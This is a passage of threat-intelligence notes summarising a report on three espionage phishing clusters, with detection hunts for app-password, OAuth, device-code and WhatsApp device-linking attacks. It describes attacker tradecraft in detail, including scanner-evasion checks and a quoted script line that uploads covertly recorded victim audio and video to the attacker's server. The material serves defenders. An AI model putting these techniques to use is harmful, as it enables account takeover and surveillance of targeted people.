  extended_notes: "\n=== DELIVERABLE 1 -- PER-CLUSTER TRADECRAFT STEPS, IN ORDER, WITH TELEMETRY SURFACING\
    \ ===\n\n--- UNC6293 (moderate-confidence ICE RELIC sub-cluster; initial-access role) ---\nFlow A\
    \ -- app-specific-password (ASP) phishing, running continuously since June 2025:\n 1. Outreach impersonating\
    \ a US State Department official (GTIG: \"UNC6293 has continued to impersonate\n    State Department\
    \ officials and perform app password phishing\"). Small volume: \"usually targeting\n    fewer than\
    \ five users at a time\". Themes: diplomatic events, upcoming conferences/meetings.\n 2. A PDF lure\
    \ carries screenshots of the exact account-settings screens the actor wants the victim to\n    use,\
    \ including the app-password name to type. GTIG notes the October 2025 PDF reused the *same*\n   \
    \ screenshots as June 2025, including the ms.state.gov app-password name.\n 3. 2025 behaviour: victim\
    \ emails the app password back to the actor. 2026 behaviour (the delta):\n    \"the attacker asked\
    \ for it to be entered into an authentication form on an otherwise legitimate\n    looking website\"\
    \ -- i.e. the credential is collected by the actor's web infrastructure, so it never\n    appears\
    \ in the victim's Sent items.\n 4. Actor authenticates with the ASP, which by design bypasses 2FA.\n\
    \ Telemetry surfacing:\n  - Identity/account-audit: app-specific-password CREATION events on the user's\
    \ account (Google\n    Workspace admin audit / account activity), correlated against inbound-mail\
    \ timestamps. The ASP\n    name itself is attacker-chosen and thematic (GTIG cites ms.state.gov) --\
    \ an ASP whose label names\n    a government body, a \"secure file sharing\" service, or an event\
    \ is the anomaly, not a random one.\n  - Sign-in logs: successful authentication using an ASP / \"\
    less secure app\" credential path, from an\n    ASN inconsistent with the user's baseline; GTIG states\
    \ all three clusters use commercial\n    residential proxies for post-compromise activity, so expect\
    \ residential-ISP ASNs rather than\n    hosting ASNs -- geo/ASN velocity is a weaker signal here than\
    \ protocol-path anomaly (ASP/IMAP/SMTP\n    session where the user normally only ever uses the browser/OAuth\
    \ path).\n  - Mail flow: inbound PDF attachment from an external sender whose display name asserts\
    \ a government\n    role; and (2025 shape only) an OUTBOUND user mail containing a newly-created ASP.\n\
    \  - Endpoint: essentially nothing. There is no payload in this flow. Treat endpoint silence as expected.\n\
    Flow B -- OAuth \"verification code\" phishing, first observed June 2026:\n 1. Victim is directed\
    \ to an actor page (GTIG cites foreignrelations[.]us) and performs a *genuine*\n    login at an external\
    \ provider.\n 2. The page asks the victim to paste back \"either the full URL or 'verification code'\"\
    .\n 3. GTIG: \"By providing the requested verification code the target would grant UNC6293 access\
    \ to the\n    account.\"\n Telemetry surfacing:\n  - OAuth grant / consent records: a consent or token\
    \ grant to an application the tenant has never\n    seen, immediately after a legitimate interactive\
    \ sign-in, with the token redemption arriving from a\n    different network path than the sign-in.\
    \ The sign-in itself is clean -- the anomaly is the\n    grant-then-foreign-redemption pair, not a\
    \ failed logon.\n  - Note for defenders: because the victim completes a real login, there is NO failed-auth,\
    \ NO\n    impossible-travel on the sign-in, and NO MFA denial. Detections keyed on those three will\
    \ not fire.\n\n--- UNC7005 (aka STORM-2945; moderate-confidence ICE RELIC-linked; identified February\
    \ 2026) ---\nFlow A -- per-target app-password phishing (since at least February 2026):\n 1. Social-engineering\
    \ landing page themed to the pretext.\n 2. ASPs are \"unique per target in all observed cases except\
    \ one\" and named for the pretext (GTIG gives\n    \"secure file sharing\" as an example theme) or\
    \ for the impersonated organisation.\n Telemetry surfacing: same ASP-creation and ASP-authentication\
    \ signals as UNC6293 Flow A, but with the\n added property that the ASP label is per-victim, so label-blocklisting\
    \ does not work -- hunt on\n \"an ASP was created at all\", scoped to high-risk user populations.\n\
    Flow B -- Microsoft device-code phishing:\n 1. Email, sometimes from actor-registered domains masquerading\
    \ as a real event/organisation, links to\n    an actor site; templates are reused between operations\
    \ (the late-April 2026 \"embassy invite\"\n    template was reused in May 2026 to spoof the legitimate\
    \ GLOBSEC forum).\n 2. On page load the victim's browser is fingerprinted (screen size, timezone,\
    \ language, platform,\n    hardware concurrency, device memory, maxTouchPoints POSTed to /fingerprint)\
    \ -- GTIG: \"likely to\n    check for an automated scanner accessing the page\".\n 3. The victim completes\
    \ a detailed conference-registration form. GTIG flags an epicurean wine\n    selection as a legacy\
    \ ICE RELIC theme.\n 4. The victim is then prompted for \"identity verification\" and shown the device\
    \ code. GTIG notes an\n    OPSEC artefact: the GLOBSEC page's text still referred to \"Embassy security\
    \ policy\".\n 5. Within days of GTIG identifying the activity the actor revised the template, citing\
    \ technical\n    difficulties in the page text, changed the questions and colour scheme, and added\
    \ headless-browser\n    detection (navigator.webdriver, empty navigator.languages, missing window.chrome,\
    \ notification\n    permission-state mismatch -> blank the DOM and window.stop()).\n Telemetry surfacing:\n\
    \  - Identity: device-code / device-authorization grant flow initiations and completions. The\n  \
    \  fingerprint is a device-code auth where the code was *requested* from actor infrastructure and\n\
    \    *redeemed* by the user's own browser session, so the resulting token appears legitimate; the\n\
    \    detectable pair is (a) a device-code grant for a user population that has no device-code use\
    \ case,\n    and (b) sign-in from a residential-proxy ASN shortly after.\n  - OAuth/consent + device-registration:\
    \ GTIG describes the endpoint of the equivalent Microsoft\n    activity elsewhere as account access;\
    \ for the Storm-2945 half already covered by this pipeline\n    (2026-08-01 entry) Microsoft documented\
    \ device-code phishing leading to Entra device registration\n    -- so device-registration events\
    \ (a new device joined/registered against a user immediately after\n    a device-code grant) are the\
    \ highest-value single hook.\n  - Mail flow: inbound invitation mail referencing a real conference\
    \ from a lookalike domain registered\n    within days-to-weeks; newly-registered-domain scoring on\
    \ the sender/link domain is effective here\n    because GTIG dates the registrations tightly (e.g.\
    \ three OWA-themed domains registered 16-23 July).\n  - Web/DNS egress: a POST to /fingerprint on\
    \ first page load is a distinctive request shape for\n    proxy/DNS-log hunting; so is a page that\
    \ returns an empty DOM to your sandbox but content to a\n    real user (i.e. sandbox-clean verdicts\
    \ should not close the alert).\nFlow C -- WhatsApp device linking (May-June 2026) -- see DELIVERABLE\
    \ 3 below for full detail.\nFlow D -- browser-stealer / MaaS wave (late May 2026, the broadest UNC7005\
    \ wave GTIG had seen):\n 1. Phishing mail with a malicious URL to \"prominent, mostly US based academics,\
    \ diplomats, and\n    researchers focused on Russia and former Soviet states\". GTIG notes the sender\
    \ address was almost\n    identical to one used in a June 2025 UNC6293 operation.\n 2. Windows/macOS\
    \ browsers get a landing page spoofing a \"summit\" on a Ukraine-support resolution;\n    other OSes\
    \ get an error telling the user to switch OS \"for compatibility\".\n 3. The page carries resolution\
    \ text and even actor contact details for \"questions or technical\n    difficulties\".\n 4. Clicking\
    \ \"Summit Companion App\" serves VIDAR (obfuscated Go binary) to Windows User-Agents and\n    ATOMIC/AtomicStealer\
    \ to macOS User-Agents. Both are MaaS infostealers targeting browser-stored\n    credentials, payment\
    \ data, cookies and saved addresses; GTIG states VIDAR sends to C2 in plaintext.\n Telemetry surfacing:\n\
    \  - Endpoint: user-initiated download-then-execute from a browser download path, parent lineage browser\n\
    \    -> installer/binary; on macOS the ATOMIC family class. Browser-credential-store and cookie-store\n\
    \    file access by a non-browser process is the collection-stage hook.\n  - Egress: plaintext exfil\
    \ to a single hardcoded C2 is unusually easy to see in TLS-less egress or in\n    proxy logs -- worth\
    \ an explicit hunt because it is a rare gift.\n  - Mail/web: OS-conditional content delivery means\
    \ your macOS fleet and your Windows fleet see\n    different pages from the same URL; a sandbox pinned\
    \ to one OS under-reports.\nFlow E -- Google OAuth phishing via unverified cloud project (from 31\
    \ July 2026) -- DELIVERABLE 2.\nFlow F -- direct Microsoft OAuth URLs (early August 2026): \"UNC7005\
    \ sent legitimate Microsoft OAuth\n URLs directly to targets\", from the same attacker email as Flow\
    \ E. Telemetry: a *legitimate*\n login.microsoftonline.com URL arriving by mail is not a lookalike-domain\
    \ detection -- the hook is the\n consent/grant record for an unfamiliar client_id, not the URL.\n\n\
    --- UNC5976 (distinct cluster; OAuth-focused; tracked by GTIG since March 2026) ---\n 1. Purchase\
    \ a domain, \"usually using file sharing related domain names\".\n 2. Create a cloud project tied\
    \ to that domain.\n 3. Host a fake file-sharing page; after the victim has been on the page a few\
    \ seconds, pop a login\n    dialog (\"Continue with Google\").\n 4. The victim is taken to a legitimate\
    \ Google OAuth login page.\n 5. After authenticating, the victim is redirected to a Google Cloud project\
    \ URL whose scripts\n    \"retrieve the authentication token from the URL and save it for the operator\
    \ to later retrieve\".\n 6. Separately: HEADRUSH Excel plugin -> HTA downloader (DELIVERABLE 5).\n\
    \ 7. Post-compromise uses dedicated infrastructure, NOT residential proxies -- the one place where\n\
    \    infrastructure-based triage separates UNC5976 from the ICE RELIC-linked clusters.\n Telemetry\
    \ surfacing:\n  - OAuth grant/consent records and the \"unverified app\" interstitial (DELIVERABLE\
    \ 2).\n  - Because the token is scraped from the redirect URL rather than from a consent grant to\
    \ a\n    long-lived app, the durable artefact may be only the token's later USE: token replay from\
    \ an\n    ASN/device that never performed an interactive sign-in. Hunt for authenticated API/mail\
    \ access\n    with no preceding interactive authentication event for that session.\n\n=== DELIVERABLE\
    \ 2 -- OAUTH TOKEN THEFT VIA UNVERIFIED / TESTING-MODE CLOUD PROJECT ===\nWhat GTIG actually states,\
    \ in full and with its hedges intact:\n - UNC7005 (hedged): \"If the target authenticates, they are\
    \ redirected to an attacker-controlled,\n   testing mode, unverified cloud project which is likely\
    \ used to steal authentication tokens that\n   grant the attacker access to the target account.\"\
    \ Note \"likely\" -- GTIG does NOT claim to have\n   confirmed the theft mechanism for UNC7005.\n\
    \ - UNC5976 (unhedged, and this is where the mechanism is actually stated): \"After authenticating,\
    \ the\n   target was redirected to a Google Cloud project URL. The cloud project hosted malicious\
    \ scripts\n   that retrieve the authentication token from the URL and save it for the operator to\
    \ later retrieve.\"\n - So: the token is reachable because it is IN THE REDIRECT URL itself. The victim's\
    \ browser follows a\n   normal OAuth redirect to a redirect_uri the attacker controls (a cloud project\
    \ URL); scripts hosted\n   at that URL read the token out of the URL (fragment/query) client-side\
    \ and persist it server-side\n   for asynchronous operator pickup. GTIG does not name the grant type\
    \ or the exact URL component;\n   do not assert implicit-flow/fragment specifics it does not state.\n\
    \ - \"Unverified\"/\"testing mode\" status: GTIG explains it only from the defensive side -- \"In\
    \ specific\n   scenarios, to protect users from deceptive apps, we display a warning 'unverified app'\
    \ screen before\n   showing users the OAuth consent screen for authentication for unverified, testing\
    \ mode cloud\n   projects with permissions scopes considered sensitive.\" So the practical meaning\
    \ is: a Google Cloud\n   project whose OAuth client has not passed Google's app-verification review\
    \ and is still in testing\n   publishing status. It can still initiate a real Google OAuth flow; what\
    \ it earns is a Google\n   interstitial warning, and only \"in specific scenarios\" and only where\
    \ the requested scopes are\n   considered sensitive. That conditionality is the gap the actors are\
    \ operating in -- the composed\n   entry must not imply the interstitial always fires.\n - UNC5976\
    \ scale/persistence: \"Within approximately three months of initial discovery and disruption\n   by\
    \ GTIG, UNC5976 created at least twelve new domains and related infrastructure.\"\nWhat a defender\
    \ can see in consent / audit logs:\n - The consent/grant record naming an OAuth client that is unverified\
    \ / in testing publishing status --\n   this is the single most transferable hunt from the post: enumerate\
    \ existing third-party app grants\n   in your Google Workspace / Microsoft tenant and treat \"unverified\
    \ publisher\" or \"testing\" status on\n   a grant held by a high-risk user as a finding, not an informational.\n\
    \ - A grant/redirect to a redirect_uri on cloud-project-hosted infrastructure (a generic cloud-hosting\n\
    \   hostname rather than the vendor's own domain) for an app nobody in the org recognises.\n - Google\
    \ Workspace admins: restricting 2-Step Verification to \"Only Security Keys\" or enrolling users\n\
    \   in the Advanced Protection Program blocks App Specific Password creation entirely (GTIG states\
    \ APP\n   participation \"prevents accounts from creating app passwords\"); app-access control / API-controls\n\
    \   allowlisting of third-party OAuth apps is the corresponding control for the OAuth half.\n - Absence\
    \ to state honestly: GTIG does NOT publish scope names, client IDs, or a consent-log field\n   list.\
    \ Anything more specific than the above would be invention.\n\n=== DELIVERABLE 3 -- WHATSAPP DEVICE-LINKING\
    \ ABUSE (UNC7005, May-June 2026) ===\nDisplayed to the target / what the target does, step by step:\n\
    \ 1. Victim reaches an actor phishing page spoofing WhatsApp, pretexted as needing to link a device\
    \ to\n    \"join a secure WhatsApp call, chat, or document share\".\n 2. \"Upon accessing the page,\
    \ the target is prompted to provide a phone number.\"\n 3. The actor uses that phone number to open\
    \ a *genuine* WhatsApp device-link request from the\n    attacker's device, and the page then \"displays\
    \ the legitimate QR and linking code to the target\n    alongside instructions to the user to link\
    \ their device\". The QR/code shown to the victim is real\n    WhatsApp material -- this is why it\
    \ survives visual inspection.\n 4. Victim links the attacker device to their own WhatsApp account.\
    \ Attacker now has message access.\n 5. Post-link, the page offers one of three follow-ons: join a\
    \ voice call, an \"encrypted chat\", or\n    download a file.\n 6a. Voice call -> audio/video capture.\
    \ \"If the target joins the voice call, malicious JavaScript to\n    record target audio and video\
    \ is triggered. The webpage presents a fake voice call with a ring for\n    a limited amount of time\
    \ while the audio and video are recorded.\" The script calls\n    getUserMedia({video:true,audio:true}),\
    \ shows a self-view, records with MediaRecorder\n    (video/webm;codecs=vp8,opus with fallbacks) in\
    \ 1000 ms chunks, and on \"call failure\" uploads.\n 6b. \"Encrypted chat\" -> the page renders chat\
    \ credentials plus a secondary login URL at /chat/login\n    and \"prompts the user to copy the username\
    \ and password presented to them to log in on the\n    secondary URL\" (a second credential-collection\
    \ step).\n 6c. File transfer -> a download button is rendered; GTIG: \"GTIG is unable to assess what\
    \ file may have\n    been staged for download at this time.\" Do not assert a payload here.\nUPLOAD\
    \ ENDPOINT PATH -- VERIFICATION RESULT: **CONFIRMED PRESENT IN THE POST.** GTIG writes the path\n\
    \ twice: once in prose -- \"The recording would then be sent to the attacker command-and-control (C2)\n\
    \ endpoint /api/code/<unique user session id>/recording when the call 'fails'.\" -- and once in the\n\
    \ quoted JavaScript, as fetch('/api/code/' + sessionId + '/recording', { method: 'POST', body: formData\
    \ })\n with a single retry on failure. The prose form with the <unique user session id> placeholder\
    \ is the\n quotable one and is carried in evidence[] verbatim.\nTelemetry surfacing:\n - Application-level\
    \ (highest value, and the one GTIG itself recommends): periodic audit of WhatsApp\n   \"linked devices\"\
    \ on both corporate and personal devices, and enforcement of registration lock +\n   2FA. A linked\
    \ device the user does not recognise IS the compromise.\n - Endpoint/browser: a browser tab holding\
    \ an active camera+microphone capture (OS-level mic/camera\n   in-use indicators, browser site-permission\
    \ grants) for a site that is not a known conferencing\n   domain. A media-permission grant to a non-WhatsApp,\
    \ non-conferencing origin is the crisp artefact --\n   WhatsApp Web itself does not need camera access\
    \ to link a device.\n - Egress/proxy: multipart/form-data POST of a video/webm blob to a path under\
    \ /api/code/.../recording\n   from a browser session, to a host with no conferencing reputation. Volume\
    \ is small (short recording)\n   so byte-count thresholds will miss it; the content-type + path shape\
    \ is the hook.\n - DNS: WhatsApp-themed lookalike domains (GTIG's IOC table lists several wa-* domains;\
    \ per house rules\n   the composed entry names the pattern, not the domains).\n - Mail/messenger:\
    \ GTIG expects initial outreach over encrypted messengers rather than mail -- so for a\n   large share\
    \ of this flow there is NO corporate mail artefact at all.\n\n=== DELIVERABLE 4 -- DEVICE-CODE PHISHING:\
    \ WHICH CLUSTER RUNS WHICH ===\n - Microsoft device-code phishing: **UNC7005 only.** \"UNC7005 also\
    \ conducts device code phishing\n   operations for both Microsoft and WhatsApp accounts.\" Lure =\
    \ invitations to calls with people from\n   notable organisations in the target's field, and most\
    \ recently invitations to diplomatic events and\n   conferences (spoofed GLOBSEC forum, embassy-invite\
    \ template). Result = the actor holds tokens for\n   the victim's Microsoft account.\n - WhatsApp:\
    \ UNC7005, and GTIG classes it under the same \"device code phishing\" sentence, but the\n   mechanism\
    \ it then describes is device *linking* (QR/linking code), not an OAuth device-code grant.\n   Keep\
    \ GTIG's own wording; do not silently relabel it.\n - **CORRECTION TO THE FRAMING IN THE SPAWN BRIEF\
    \ AND IN findings.S3.yaml: there is NO Google\n   device-code phishing in this post.** The Google-side\
    \ activity is OAuth phishing, in three distinct\n   shapes: (a) UNC6293 asking for the redirect URL\
    \ or \"verification code\" after a genuine external\n   login (June 2026); (b) UNC7005 redirecting\
    \ into an attacker-controlled unverified/testing-mode cloud\n   project (from 31 July 2026); (c) UNC5976\
    \ redirecting to a Google Cloud project URL whose scripts\n   scrape the token out of the URL (from\
    \ March 2026). GTIG never uses \"device code\" for any Google flow.\n - Also UNC7005-only: sending\
    \ *legitimate* Microsoft OAuth URLs directly to targets (early August 2026).\n\n=== DELIVERABLE 5\
    \ -- UNC5976 HEADRUSH AND THE SPOOFED INSTITUTE DOMAIN ===\n - What it is: \"In addition to these\
    \ phishing pages, we have also observed UNC5976 leverage a malicious\n   Excel plugin, which we named\
    \ HEADRUSH.\" GTIG names it; it is a GTIG-assigned family name.\n - What it does: an April 2026 HEADRUSH\
    \ sample \"ultimately led to an HTML Application (HTA) downloader\".\n   That is the whole functional\
